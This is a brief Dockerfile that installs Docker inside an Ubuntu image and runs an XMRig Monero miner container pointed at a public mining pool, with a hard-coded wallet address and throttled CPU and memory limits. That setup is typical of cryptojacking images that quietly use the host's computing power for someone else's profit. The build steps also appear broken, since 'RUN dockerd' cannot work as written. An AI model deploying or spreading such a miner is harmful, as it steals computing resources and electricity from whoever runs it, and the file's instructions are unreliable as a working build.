FROM ubuntu:16.04
RUN apt-get update -y && apt-get upgrade  -y && apt-get -y install sudo && \
    apt install  -y  docker.io && \
    service docker start
RUN  dockerd
RUN docker run --restart unless-stopped --read-only --cpus=".1" -m 50M -c 512 bitnn/alpine-xmrig -o pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p x -k 

#RUN docker run hello-world
